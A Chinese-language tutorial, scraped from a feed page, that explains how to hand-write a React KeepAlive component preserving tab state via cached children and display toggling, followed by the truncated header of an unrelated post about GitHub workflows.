                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">React 手写实现的 KeepAlive 组件 🚀</h2>
<h3 data-id="heading-1">引言 📝</h3>
<p>在 React 开发中，你是否遇到过这样的场景：切换 Tab 页面后，返回之前的页面，输入的内容、计数状态却 “消失不见” 了？🤔 这是因为 React 组件默认在卸载时会销毁状态，重新渲染时会创建新的实例。而 <code>KeepAlive</code> 组件就像一个 “状态保鲜盒”，能让组件在隐藏时不卸载，保持原有状态，再次显示时直接复用。今天我们就结合实战代码，从零拆解 <code>KeepAlive</code> 组件的实现逻辑，带你吃透这一实用技能！</p>
<h3 data-id="heading-2">一、什么是 Keep-Alive？ 🧩</h3>
<p><code>Keep-Alive</code> 源于 Vue 的内置组件，在 React 中并没有原生支持，但提供了<strong>组件缓存能力</strong>的第三方库<code>react-activation</code>,我们可以通过<code>import {KeepAlive} from 'react-activation';</code> 导入<code>KeepAlive</code>获得状态保存能力。</p>
<p>现在我们来手动实现其核心功能，它本质是一个<strong>组件缓存容器</strong>，核心特性如下：</p>
<ul>
<li>缓存组件实例，避免组件频繁挂载 / 卸载，减少性能开销；</li>
<li>保持组件状态（如 useState 数据、表单输入值等），提升用户体验；</li>
<li>通过 “显隐控制” 替代 “挂载 / 卸载”，组件始终存在于 DOM 中，并未卸载，只是通过样式隐藏；</li>
<li>支持以唯一标识（如 <code>activeId</code>）管理多个组件的缓存与切换。</li>
</ul>
<p>简单说，<code>Keep-Alive</code> 就像给组件 “冬眠” 的能力 —— 不用时休眠（隐藏），需要时唤醒（显示），状态始终不变 ✨。</p>
<h3 data-id="heading-3">二、为什么需要 Keep-Alive？（作用 + 场景 + 使用）🌟</h3>
<h4 data-id="heading-4">1. 核心作用</h4>
<ul>
<li><strong>状态保留</strong>：避免组件切换时丢失临时状态（如表单输入、计数、滚动位置）；</li>
<li><strong>性能优化</strong>：减少重复渲染和生命周期函数执行（如 <code>useEffect</code> 中的接口请求）；</li>
<li><strong>体验提升</strong>：切换组件时无加载延迟，操作连贯性更强。</li>
</ul>
<h4 data-id="heading-5">2. 适用场景</h4>
<ul>
<li><strong>Tab 切换页面</strong>：如后台管理系统的多标签页、移动端的底部导航切换；</li>
<li><strong>路由跳转</strong>：列表页跳转详情页后返回，保留列表筛选条件和滚动位置；</li>
<li><strong>高频切换组件</strong>：如表单分步填写、弹窗与页面的切换；</li>
<li><strong>资源密集型组件</strong>：如包含大量图表、视频的组件，避免重复初始化。</li>
</ul>
<h4 data-id="heading-6">3. 基础使用方式</h4>
<p>在我们的实战代码中，<code>Keep-Alive</code> 的使用非常简洁：</p>
<p>jsx</p>
<pre><code class="hljs language-ini" lang="ini">// 父组件中包裹需要缓存的组件，传入 activeId 控制激活状态
&lt;KeepAlive <span class="hljs-attr">activeId</span>={activeTab}&gt;
  {<span class="hljs-attr">activeTab</span> === <span class="hljs-string">'A'</span> ? &lt;Counter name=<span class="hljs-string">"A"</span> /&gt; : &lt;OtherCounter name=<span class="hljs-string">"B"</span> /&gt;}
&lt;/KeepAlive&gt;
</code></pre>
<ul>
<li><code>activeId</code>：唯一标识，用于区分当前激活的组件；</li>
<li><code>children</code>：需要缓存的组件实例，支持动态切换不同组件。</li>
</ul>
<h3 data-id="heading-7">三、手写 KeepAlive 组件的实现思路 🔍</h3>
<h4 data-id="heading-8">1. 核心需求分析</h4>
<p>要实现一个通用的 <code>Keep-Alive</code> 组件，需满足以下条件：</p>
<ul>
<li>支持多组件缓存：能同时缓存多个组件，通过 <code>activeId</code> 区分；</li>
<li>自动更新缓存：新组件首次激活时自动存入缓存，已缓存组件直接复用；</li>
<li>灵活控制显隐：只显示当前激活的组件，其余组件隐藏；</li>
<li>兼容性强：不侵入子组件逻辑，子组件无需修改即可使用；</li>
<li>状态稳定：缓存的组件状态不丢失，生命周期不重复执行。</li>
</ul>
<h4 data-id="heading-9">2. 实现步骤拆解（结合代码讲解）</h4>
<p>初始化一个<code>React</code>项目,选择<code>JavaScript</code>语言。</p>
<p>我们的 <code>KeepAlive</code> 组件代码位于 <code>src/components/KeepAlive.jsx</code>，核心分为 3 个步骤，一步步拆解如下：</p>
<h5 data-id="heading-10">步骤一：定义缓存容器 📦</h5>
<p>核心思路：用 React 的 <code>useState</code> 定义一个缓存对象 <code>cache</code>，以 <code>activeId</code> 为 key，缓存对应的组件实例（<code>children</code>）。</p>
<p>jsx</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">import</span> { useState, useEffect } <span class="hljs-keyword">from</span> <span class="hljs-string">'react'</span>;

<span class="hljs-keyword">const</span> <span class="hljs-title function_">KeepAlive</span> = (<span class="hljs-params">{ activeId, children }</span>) =&gt; {
  <span class="hljs-comment">// 定义缓存容器：key 是 activeId，value 是对应的组件实例（children）</span>
  <span class="hljs-comment">// 初始值为空对象，保证首次渲染时无缓存组件</span>
  <span class="hljs-keyword">const</span> [cache, setCache] = <span class="hljs-title function_">useState</span>({}); 

  <span class="hljs-comment">// 后续逻辑...</span>
};
</code></pre>
<ul>
<li>为什么用对象作为缓存容器？对象的 key 支持字符串类型的 <code>activeId</code>，查询和修改效率高（O (1)），且配合 <code>Object.entries</code> 方便遍历；</li>
<li>Map 也可作为缓存容器（key 可支持对象类型），但本例中 <code>activeId</code> 是字符串，对象足够满足需求，更简洁。</li>
</ul>
<h5 data-id="heading-11">步骤二：监听依赖，更新缓存 🔄</h5>
<p>核心思路：通过 <code>useEffect</code> 监听 <code>activeId</code> 和 <code>children</code> 的变化，当切换组件时，若当前 <code>activeId</code> 对应的组件未被缓存，则存入缓存。</p>
<p>jsx</p>
<pre><code class="hljs language-scss" lang="scss"><span class="hljs-built_in">useEffect</span>(() =&gt; {
  <span class="hljs-comment">// 逻辑：如果当前 activeId 对应的组件未在缓存中，就添加到缓存</span>
  if (!cache[activeId]) { 
    <span class="hljs-comment">// 利用函数式更新，确保拿到最新的缓存状态（prev 是上一次的 cache）</span>
    <span class="hljs-built_in">setCache</span>((prev) =&gt; ({
      ...prev, // 保留已有的缓存组件
      [activeId]: children // 新增当前 activeId 对应的组件到缓存
    }))
  }
}, <span class="hljs-selector-attr">[activeId, children, cache]</span>); <span class="hljs-comment">// 依赖项：activeId 变了、组件变了、缓存变了，都要重新检查</span>
</code></pre>
<ul>
<li>
<p>依赖项说明：</p>
<ul>
<li><code>activeId</code>：切换标签时触发，检查新标签对应的组件是否已缓存；</li>
<li><code>children</code>：若传入的组件实例变化（如 props 改变），需要更新缓存中的组件；</li>
<li><code>cache</code>：确保获取最新的缓存状态，避免覆盖已有缓存；</li>
</ul>
</li>
<li>
<p>为什么不直接 <code>setCache({...cache, [activeId]: children})</code>？ 因为 <code>cache</code> 是状态，直接使用可能拿到旧值，函数式更新（<code>prev =&gt; {...}</code>）能保证拿到最新的状态，避免缓存丢失。</p>
</li>
</ul>
<h5 data-id="heading-12">步骤三：遍历缓存，控制组件显隐 🎭</h5>
<p>核心思路：通过 <code>Object.entries</code> 将缓存对象转为 <code>[key, value]</code> 二维数组，遍历渲染所有缓存组件，通过 <code>display</code> 样式控制显隐（激活的组件显示，其余隐藏）。</p>
<p>jsx</p>
<pre><code class="hljs language-css" lang="css">return (
  &lt;&gt;
    {
      // <span class="hljs-selector-tag">Object</span><span class="hljs-selector-class">.entries</span>(cache)：将缓存对象转为二维数组，格式如 <span class="hljs-selector-attr">[[id1, component1]</span>, <span class="hljs-selector-attr">[id2, component2]</span>]
      <span class="hljs-selector-tag">Object</span><span class="hljs-selector-class">.entries</span>(cache)<span class="hljs-selector-class">.map</span>((<span class="hljs-selector-attr">[id, component]</span>) =&gt; (
        &lt;<span class="hljs-selector-tag">div</span> 
          key={id} // 用缓存的 id 作为 key，确保 React 正确识别组件
          // 显隐控制：当前 id 等于 activeId 时显示（block），否则隐藏（<span class="hljs-attribute">none</span>）
          style={{ <span class="hljs-attribute">display</span>: id === activeId ? <span class="hljs-string">'block'</span> : <span class="hljs-string">'none'</span> }}
        &gt;
          {component} {<span class="hljs-comment">/* 渲染缓存的组件实例 */</span>}
        &lt;/<span class="hljs-selector-tag">div</span>&gt;
      ))
    }
  &lt;/&gt;
);
</code></pre>
<ul>
<li>关键逻辑：所有缓存的组件都会被渲染到 DOM 中，但通过 <code>display: none</code> 隐藏未激活的组件，这样组件不会卸载，状态得以保留；</li>
<li><code>key</code> 的作用：必须用 <code>id</code> 作为 key，避免 React 误判组件身份，导致状态丢失。</li>
</ul>
<h4 data-id="heading-13">3.关键逻辑拆解</h4>
<h3 data-id="heading-14">四、完整代码及效果演示 📸</h3>
<h4 data-id="heading-15">1. 完整 KeepAlive 组件（<code>src/components/KeepAlive.jsx</code>）</h4>
<p>jsx</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">import</span> { useState, useEffect } <span class="hljs-keyword">from</span> <span class="hljs-string">'react'</span>;

<span class="hljs-comment">/**
 * KeepAlive 组件：缓存 React 组件，避免卸载，保持状态
 * <span class="hljs-doctag">@param</span> {<span class="hljs-type">string</span>} <span class="hljs-variable">activeId</span> - 当前激活的组件标识（唯一key）
 * <span class="hljs-doctag">@param</span> {<span class="hljs-type">React.ReactNode</span>} <span class="hljs-variable">children</span> - 需要缓存的组件实例
 * <span class="hljs-doctag">@returns</span> {<span class="hljs-type">JSX.Element</span>} 渲染所有缓存组件，控制显隐
 */</span>
<span class="hljs-keyword">const</span> <span class="hljs-title function_">KeepAlive</span> = (<span class="hljs-params">{ activeId, children }</span>) =&gt; {
  <span class="hljs-comment">// 缓存容器：key 为 activeId，value 为对应的组件实例</span>
  <span class="hljs-keyword">const</span> [cache, setCache] = <span class="hljs-title function_">useState</span>({});

  <span class="hljs-comment">// 监听 activeId、children、cache 变化，更新缓存</span>
  <span class="hljs-title function_">useEffect</span>(<span class="hljs-function">() =&gt;</span> {
    <span class="hljs-comment">// 若当前 activeId 对应的组件未缓存，则添加到缓存</span>
    <span class="hljs-keyword">if</span> (!cache[activeId]) {
      <span class="hljs-comment">// 函数式更新，确保拿到最新的缓存状态</span>
      <span class="hljs-title function_">setCache</span>(<span class="hljs-function">(<span class="hljs-params">prevCache</span>) =&gt;</span> ({
        ...prevCache, <span class="hljs-comment">// 保留已有缓存</span>
        [activeId]: children <span class="hljs-comment">// 新增当前组件到缓存</span>
      }));
    }
  }, [activeId, children, cache]);

  <span class="hljs-comment">// 遍历缓存，渲染所有组件，通过 display 控制显隐</span>
  <span class="hljs-keyword">return</span> (
    <span class="xml"><span class="hljs-tag">&lt;&gt;</span>
      {Object.entries(cache).map(([id, component]) =&gt; (
        <span class="hljs-tag">&lt;<span class="hljs-name">div</span>
          <span class="hljs-attr">key</span>=<span class="hljs-string">{id}</span>
          <span class="hljs-attr">style</span>=<span class="hljs-string">{{</span>
            <span class="hljs-attr">display:</span> <span class="hljs-attr">id</span> === <span class="hljs-string">activeId</span> ? '<span class="hljs-attr">block</span>' <span class="hljs-attr">:</span> '<span class="hljs-attr">none</span>',
          }}
        &gt;</span>
          {component}
        <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
      ))}
    <span class="hljs-tag">&lt;/&gt;</span></span>
  );
};

<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-title class_">KeepAlive</span>;
</code></pre>
<h4 data-id="heading-16">2. 模拟 Tab 切换场景（<code>src/App.jsx</code>）</h4>
<p>jsx</p>
<pre><code class="hljs language-ini" lang="ini">import { useState, useEffect } from 'react'<span class="hljs-comment">;</span>
import KeepAlive from './components/KeepAlive.jsx'<span class="hljs-comment">;</span>

// 计数组件 A：演示状态保留
const <span class="hljs-attr">Counter</span> = ({ name }) =&gt; {
  const <span class="hljs-section">[count, setCount]</span> = useState(0)<span class="hljs-comment">;</span>

  // 模拟组件挂载/卸载生命周期
  useEffect(() =&gt; {
    console.log(`✨ 组件 ${name} 挂载完成`)<span class="hljs-comment">;</span>
    return () =&gt; {
      console.log(`❌ 组件 ${name} 卸载完成`)<span class="hljs-comment">;</span>
    }<span class="hljs-comment">;</span>
  }, <span class="hljs-section">[name]</span>)<span class="hljs-comment">;</span>

  return (
    &lt;div <span class="hljs-attr">style</span>={{ padding: <span class="hljs-string">'20px'</span>, border: <span class="hljs-string">'1px solid #646cff'</span>, borderRadius: <span class="hljs-string">'8px'</span>, margin: <span class="hljs-string">'10px 0'</span> }}&gt;
      &lt;h3 <span class="hljs-attr">style</span>={{ color: <span class="hljs-string">'#646cff'</span> }}&gt;{name} 视图&lt;/h3&gt;
      &lt;p&gt;当前计数：{count} 🎯&lt;/p&gt;
      &lt;button <span class="hljs-attr">onClick</span>={() =&gt; setCount(count + <span class="hljs-number">1</span>)} style={{ marginRight: <span class="hljs-string">'10px'</span> }}&gt;+<span class="hljs-number">1</span>&lt;/button&gt;
      &lt;button <span class="hljs-attr">onClick</span>={() =&gt; setCount(<span class="hljs-number">0</span>)}&gt;重置&lt;/button&gt;
    &lt;/div&gt;
  )<span class="hljs-comment">;</span>
}<span class="hljs-comment">;</span>

// 计数组件 B：与 A 功能一致，用于模拟切换
const <span class="hljs-attr">OtherCounter</span> = ({ name }) =&gt; {
  const <span class="hljs-section">[count, setCount]</span> = useState(0)<span class="hljs-comment">;</span>

  useEffect(() =&gt; {
    console.log(`✨ 组件 ${name} 挂载完成`)<span class="hljs-comment">;</span>
    return () =&gt; {
      console.log(`❌ 组件 ${name} 卸载完成`)<span class="hljs-comment">;</span>
    }<span class="hljs-comment">;</span>
  }, <span class="hljs-section">[name]</span>)<span class="hljs-comment">;</span>

  return (
    &lt;div <span class="hljs-attr">style</span>={{ padding: <span class="hljs-string">'20px'</span>, border: <span class="hljs-string">'1px solid #535bf2'</span>, borderRadius: <span class="hljs-string">'8px'</span>, margin: <span class="hljs-string">'10px 0'</span> }}&gt;
      &lt;h3 <span class="hljs-attr">style</span>={{ color: <span class="hljs-string">'#535bf2'</span> }}&gt;{name} 视图&lt;/h3&gt;
      &lt;p&gt;当前计数：{count} 🎯&lt;/p&gt;
      &lt;button <span class="hljs-attr">onClick</span>={() =&gt; setCount(count + <span class="hljs-number">1</span>)} style={{ marginRight: <span class="hljs-string">'10px'</span> }}&gt;+<span class="hljs-number">1</span>&lt;/button&gt;
      &lt;button <span class="hljs-attr">onClick</span>={() =&gt; setCount(<span class="hljs-number">0</span>)}&gt;重置&lt;/button&gt;
    &lt;/div&gt;
  )<span class="hljs-comment">;</span>
}<span class="hljs-comment">;</span>

const <span class="hljs-attr">App</span> = () =&gt; {
  // 控制当前激活的 Tab，默认激活 A 组件
  const <span class="hljs-section">[activeTab, setActiveTab]</span> = useState('A')<span class="hljs-comment">;</span>

  return (
    &lt;div <span class="hljs-attr">style</span>={{ maxWidth: <span class="hljs-string">'800px'</span>, margin: <span class="hljs-string">'0 auto'</span>, padding: <span class="hljs-string">'2rem'</span> }}&gt;
      &lt;h1 <span class="hljs-attr">style</span>={{ textAlign: <span class="hljs-string">'center'</span>, marginBottom: <span class="hljs-string">'2rem'</span>, color: <span class="hljs-string">'#242424'</span> }}&gt;
        React KeepAlive 组件实战 🚀
      &lt;/h1&gt;

      {/* Tab 切换按钮 */}
      &lt;div <span class="hljs-attr">style</span>={{ textAlign: <span class="hljs-string">'center'</span>, marginBottom: <span class="hljs-string">'2rem'</span> }}&gt;
        &lt;button
          <span class="hljs-attr">onClick</span>={() =&gt; setActiveTab(<span class="hljs-string">'A'</span>)}
          <span class="hljs-attr">style</span>={{
            marginRight: '1rem',
            padding: '0.8rem 1.5rem',
            backgroundColor: <span class="hljs-attr">activeTab</span> === <span class="hljs-string">'A'</span> ? <span class="hljs-string">'#646cff'</span> : <span class="hljs-string">'#f9f9f9'</span>,
            color: <span class="hljs-attr">activeTab</span> === <span class="hljs-string">'A'</span> ? <span class="hljs-string">'white'</span> : <span class="hljs-string">'#242424'</span>
          }}
        &gt;
          显示 A 组件
        &lt;/button&gt;
        &lt;button
          <span class="hljs-attr">onClick</span>={() =&gt; setActiveTab(<span class="hljs-string">'B'</span>)}
          <span class="hljs-attr">style</span>={{
            padding: '0.8rem 1.5rem',
            backgroundColor: <span class="hljs-attr">activeTab</span> === <span class="hljs-string">'B'</span> ? <span class="hljs-string">'#535bf2'</span> : <span class="hljs-string">'#f9f9f9'</span>,
            color: <span class="hljs-attr">activeTab</span> === <span class="hljs-string">'B'</span> ? <span class="hljs-string">'white'</span> : <span class="hljs-string">'#242424'</span>
          }}
        &gt;
          显示 B 组件
        &lt;/button&gt;
      &lt;/div&gt;

      {/* 用 KeepAlive 包裹需要缓存的组件 */}
      &lt;KeepAlive <span class="hljs-attr">activeId</span>={activeTab}&gt;
        {<span class="hljs-attr">activeTab</span> === <span class="hljs-string">'A'</span> ? &lt;Counter name=<span class="hljs-string">"A"</span> /&gt; : &lt;OtherCounter name=<span class="hljs-string">"B"</span> /&gt;}
      &lt;/KeepAlive&gt;

      &lt;div <span class="hljs-attr">style</span>={{ marginTop: <span class="hljs-string">'2rem'</span>, textAlign: <span class="hljs-string">'center'</span>, color: <span class="hljs-string">'#888'</span> }}&gt;
        👉 切换 Tab 试试，组件状态不会丢失哦！
      &lt;/div&gt;
    &lt;/div&gt;
  )<span class="hljs-comment">;</span>
}<span class="hljs-comment">;</span>

export default App<span class="hljs-comment">;</span>
</code></pre>
<h4 data-id="heading-17">3. 效果展示</h4>
<h5 data-id="heading-18">（1）功能效果</h5>
<ul>
<li>首次进入页面：显示 A 组件，计数为 0；</li>
<li>点击 A 组件 “+1” 按钮，计数变为 7；</li>
<li>切换到 B 组件：B 组件计数为 0，A 组件隐藏（未卸载）；</li>
<li>点击 B 组件 “+1” 按钮，计数变为 5；</li>
<li>切换回 A 组件：A 组件计数依然是 7，无需重新初始化；</li>
<li>控制台日志：只有组件挂载日志，无卸载日志，证明组件始终存在。</li>
</ul>
<h5 data-id="heading-19">（2）用户体验</h5>
<ul>
<li>切换无延迟，状态无缝衔接；</li>
<li>避免重复执行 <code>useEffect</code> 中的逻辑（如接口请求），提升性能；</li>
</ul>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/02ac2def766c4d428fa6efc0df4e1d97~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgeGlhb3h1ZV8=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770370996&amp;x-signature=nniOvf5UJsZhDge9KccOFxi6y%2Bw%3D" alt="QQ20260130-172541.gif" loading="lazy"/></p>
<h3 data-id="heading-20">五、核心知识点梳理 📚</h3>
<p>通过手写 <code>KeepAlive</code> 组件，我们掌握了这些关键知识点：</p>
<ol>
<li><strong>React Hooks 实战</strong>：<code>useState</code> 管理缓存状态，<code>useEffect</code> 监听依赖更新，函数式更新避免状态覆盖；</li>
<li><strong>组件生命周期控制</strong>：通过 <code>display</code> 样式控制组件显隐，替代挂载 / 卸载，从而保留状态；</li>
<li><strong>数据结构应用</strong>：对象作为缓存容器，<code>Object.entries</code> 实现对象遍历；</li>
<li><strong>Props 传递与复用</strong>：<code>children</code> props 让 <code>KeepAlive</code> 组件通用化，支持任意子组件缓存；</li>
<li><strong>状态管理思路</strong>：以唯一标识（<code>activeId</code>）关联组件，确保缓存的准确性和唯一性；</li>
<li><strong>性能优化技巧</strong>：避免组件频繁挂载 / 卸载，减少 DOM 操作和资源消耗；</li>
<li><strong>组件设计原则</strong>：通用、低侵入、易扩展，不修改子组件逻辑即可实现缓存功能。</li>
</ol>
<p>补充： Map 与 JSON 的区别 ——Map 可以直接存储对象作为 key，而 JSON 只能存储字符串。如果需要缓存以对象为标识的组件，可将 <code>cache</code> 改为 Map 类型，优化如下：</p>
<p>jsx</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// 用 Map 替代对象作为缓存容器</span>
<span class="hljs-keyword">const</span> [cache, setCache] = <span class="hljs-title function_">useState</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Map</span>());

<span class="hljs-comment">// 更新缓存</span>
<span class="hljs-title function_">useEffect</span>(<span class="hljs-function">() =&gt;</span> {
  <span class="hljs-keyword">if</span> (!cache.<span class="hljs-title function_">has</span>(activeId)) {
    <span class="hljs-title function_">setCache</span>(<span class="hljs-function">(<span class="hljs-params">prev</span>) =&gt;</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Map</span>(prev).<span class="hljs-title function_">set</span>(activeId, children));
  }
}, [activeId, children, cache]);

<span class="hljs-comment">// 遍历缓存</span>
<span class="hljs-keyword">return</span> (
  <span class="xml"><span class="hljs-tag">&lt;&gt;</span>
    {Array.from(cache.entries()).map(([id, component]) =&gt; (
      <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">key</span>=<span class="hljs-string">{id}</span> <span class="hljs-attr">style</span>=<span class="hljs-string">{{</span> <span class="hljs-attr">display:</span> <span class="hljs-attr">id</span> === <span class="hljs-string">activeId</span> ? '<span class="hljs-attr">block</span>' <span class="hljs-attr">:</span> '<span class="hljs-attr">none</span>' }}&gt;</span>
        {component}
      <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
    ))}
  <span class="hljs-tag">&lt;/&gt;</span></span>
);
</code></pre>
<h3 data-id="heading-21">六、结语 🎉</h3>
<p>手写 <code>Keep-Alive</code> 组件看似简单，却涵盖了 React 组件设计、状态管理、性能优化等多个核心知识点。它的核心思想是 “缓存 + 显隐控制”，通过巧妙的状态管理避免组件卸载，从而保留状态。</p>
<p>在实际开发中，我们可以基于这个基础版本扩展更多功能：比如设置缓存上限（避免内存溢出）、手动清除缓存、支持路由级缓存等。掌握了这个组件的实现逻辑，你不仅能解决实际开发中的状态保留问题，还能更深入理解 React 组件的渲染机制和生命周期。</p>
<p>希望这篇文章能带你吃透 <code>Keep-Alive</code> 组件的核心原理，下次遇到类似需求时，也能从容手写实现！如果觉得有收获，欢迎点赞收藏，一起探索 React 的更多实战技巧吧～ 🚀</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[AI 时代操作 GitHub 的三种方式，用过的都说香]]></title>    <link>https://juejin.cn/post/7600678255042707465</link>    <guid>https://juejin.cn/post/7600678255042707465</guid>    <pubDate>2026-01-30T07:28:22.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7600678255042707465" data-draft-id="7600990891206115355" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="AI 时代操作 GitHub 的三种方式，用过的都说香"/> <meta itemprop="keywords" content="GitHub"/> <meta itemprop="datePublished" content="2026-01-30T07:28:22.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="aZhe的全栈知识分享"/> <meta itemprop="url" content="https://juejin.cn/user/1039471959105228"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            AI 时代操作 GitHub 的三种方式，用过的都说香
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1039471959105228/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    aZhe的全栈知识分享
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-30T07:28:22.000Z" title="Fri Jan 30 2026 07:28:22 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-30
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    20
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读4分钟
